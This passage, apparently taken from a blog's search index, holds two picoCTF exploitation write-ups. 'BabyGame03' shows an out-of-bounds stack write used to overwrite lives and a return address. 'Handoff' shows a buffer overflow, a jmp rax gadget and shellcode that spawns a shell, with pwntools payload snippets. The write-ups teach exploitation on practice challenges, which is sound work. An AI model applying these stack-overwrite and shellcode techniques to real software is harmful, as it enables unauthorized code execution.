@.\nThe only issue with directly using the solve function is that we have a limited amount of lives/moves, and it doesn\u0026rsquo;t account for that.\nIdentifying the vulnerabilities Since the map is initialized immediately after the player lives, and there is no bounds check for the player, we can modify the tile at position map-4 (map is a 1d array from 0 to 30x90-2) so that we overwrite player_lives with 0x23 (the dot).\nplayer_arr[1] + map + 90 * player_arr basically represents the current player position on the map, and it could also be written as player_x + map + 90 * player_y.\nSo if we modify player_x to 86 and player_y to -1 we reach \u0026ldquo;player position\u0026rdquo; map-4 (out of bounds), and then we can overwrite it for unlimited lives.\nThe payload I found to reach this position (including the solve function):\npayload = b\u0026#39;www\u0026#39;+b\u0026#39;a\u0026#39;*8+b\u0026#39;wsp\u0026#39; We repeat this until we reach level 4, where things start to get a little bit more complicated.\nUsing GDB (in my case, GEF) to analyze the stack, we can find the return address of the move_player function (which is 0x804992c) \u0026ndash; by setting a breakpoint on the retn of move_player, 0x804969F, of course.\nIf we can modify that return value (which returns to main) to another address in main that comes after the level != 4 check, we can essentially reach level 5.\nIn this case, the value I chose is 0x8049970. So we only need to modify the LSB of the return value we found on the stack (we can only modify one byte, through playertile, either way).\nThe reason we can modify it is, same as player_lives, that the map array is also located on the stack, a few bytes after our return value! We can use the l command to change our playertile to \\x70.\nTo see exactly how many bytes away it is, we can use hexdump with GEF:\nAnd there it is \u0026ndash; our \\x70 value! If we count the bytes from 2c to 70, we get 51, which is the offset from the LSB to the beginning of the map (in this case our playertile was on map[0]). So we would need to go to player_y = 0 and player_x = -51.\nTo avoid getting a SEGFault by messing with all the values on the stack in between, we can first move up to player_y = -3, move to the correct x value, and then go back down to player_y = 0. And it worked!\nNow, to evade the second if problem, which keeps us in the loop, we need to change the return address from 0x804992c again. It would be nice for it to be directly in win, but since we can only modify one byte, the best value we can choose is the call to win() inside of main.\nAgain, lucky for us, that is 0x80499FE! So we modify our playertile to \\xfe, but when we repeat the same technique, something goes wrong. After inspecting the stack again, our map array shifts more towards ebp and we need to use a bigger offset to modify the return address.\nGEF\u0026rsquo;s hexdump wouldn’t show enough addresses, so I had to use this command.\nWe can see now the distance is 67 bytes, so we update the offset in our script, and voila! We got the flag!\nAnd that’s pretty much it! The rest of the code can be found on my GitHub here.\n","permalink":"https://irinasusca.github.io/writeup-blog/posts/babygame03-writeup/","summary":"\u003ch2 id=\"challenge-overview\"\u003eChallenge overview\u003c/h2\u003e\n\u003cp\u003eBreak the game and get the flag. Welcome to \u003cstrong\u003e\u003ca href=\"https://play.picoctf.org/practice/challenge/446\"\u003eBabyGame 03\u003c/a\u003e\u003c/strong\u003e! Navigate around the map and see what you can find! Be careful, you don\u0026rsquo;t have many moves. There are obstacles that instantly end the game on collision. The game is available to download here. There is no source available, so you\u0026rsquo;ll have to figure your way around the map.\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"challenge-screenshot\" loading=\"lazy\" src=\"/writeup-blog/posts/babygame03-writeup/baby-1.png#center\"\u003e\u003c/p\u003e\n\u003cp\u003eAfter analyzing the binary and renaming the variables, we notice we have a \u003cstrong\u003eplayer struct/array\u003c/strong\u003e consisting of the \u003cstrong\u003eplayer y\u003c/strong\u003e, \u003cstrong\u003eplayer x\u003c/strong\u003e and \u003cstrong\u003eplayer lives\u003c/strong\u003e.\u003c/p\u003e","title":"Pico Babygame03 Writeup"},{"content":"Challenge overview The first vuln we encounter in handoff is that it doesn\u0026rsquo;t disable NX. (Basically, this means that we can execute shellcode on the stack!)\nWe are presented with a menu with 3 options:\nAdd a recipient Send a message to a recipient Exit Upon trying to exit, we are prompted to give our feedback.\nIdentifying the vulnerability Immediately after decompiling the binary, we notice a buffer overflow in its feedback buffer. We can also see that the value at feedback[7] gets turned to \\0. However, the feedback buffer overflow is way too small for us to do anything with it, so our best bet is to find another buffer and jmp to it.\nThe perfect buffer for this is our very large message buffer! Lucky for us, rax gets the return of the previously called function (in this case gets \u0026ndash; and gets\u0026rsquo;s return is exactly our string).\nThis is because gets always returns the string it receives as input.\nSo in our feedback buffer, we need a payload that looks something like jmp addr, nop, nop, nop, until we reach rip, and then overwrite rip with a jmp rax gadget.\nObviously, our jmp addr needs to jump to our longer script, located in the message buffer, using asm(shellcraft.sh()), which will just spawn a shell for us.\nUsing ropper we find our jmp rax gadget:\njmp_rax = p64(0x40116c) We do a search-pattern of our message inside GEF, and we can find it located at $rsp - 670.\nTo find the correct offset, do the search-pattern only AFTER the script executes the jmp rax gadget (I struggled with finding the correct offset because of that for quite a bit).\nPayload Okay, so that basically means we need to do a sub rsp, 670 and a jmp rsp at the beginning of our feedback buffer. To avoid getting our payload messed up by the feedback[8] byte being changed into a null byte, we pad the payload with a few NOPs to its left.\nThen, we just adjust it to the size of the buffer overflow with NOPs, and then glue the jmp_rax gadget to its right.\npayload1 = asm(\u0026#39;nop;nop;sub rsp,670;jmp rsp;\u0026#39;) payload = payload1.ljust(20, b\u0026#39;\\x90\u0026#39;) payload += jmp_rax Don\u0026rsquo;t forget to set context.arch = 'amd64'!!! Otherwise writing assembly code won’t work.\nAnd that’s pretty much it! The rest of the code can be found on my GitHub here.\n","permalink":"https://irinasusca.github.io/writeup-blog/posts/handoff-writeup/","summary":"\u003ch2 id=\"challenge-overview\"\u003eChallenge overview\u003c/h2\u003e\n\u003cp\u003eThe first vuln we encounter in \u003cstrong\u003e\u003ca href=\"https://play.picoctf.org/practice/challenge/486\"\u003ehandoff\u003c/a\u003e\u003c/strong\u003e is that it doesn\u0026rsquo;t disable NX.\n(Basically, this means that we can execute shellcode on the stack!)\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"challenge-screenshot\" loading=\"lazy\" src=\"/writeup-blog/posts/handoff-writeup/handoff-1.png#center\"\u003e\u003c/p\u003e\n\u003cp\u003eWe are presented with a menu with 3 options:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eAdd a recipient\u003c/li\u003e\n\u003cli\u003eSend a message to a recipient\u003c/li\u003e\n\u003cli\u003eExit\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eUpon trying to exit, we are prompted to give our feedback.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"identifying-the-vulnerability\"\u003eIdentifying the vulnerability\u003c/h2\u003e\n\u003cp\u003eImmediately after decompiling the binary, we notice a buffer overflow in its feedback buffer.\nWe can also see that the value at \u003ccode\u003efeedback[7]\u003c/code\u003e gets turned to \u003ccode\u003e\\0\u003c/code\u003e. However, the feedback buffer overflow is way too small for us to do anything with it, so our best bet is to find another buffer and \u003ccode\u003ejmp\u003c/code\u003e to it.\u003c/p\u003e","title":"Pico Handoff Writeup"}]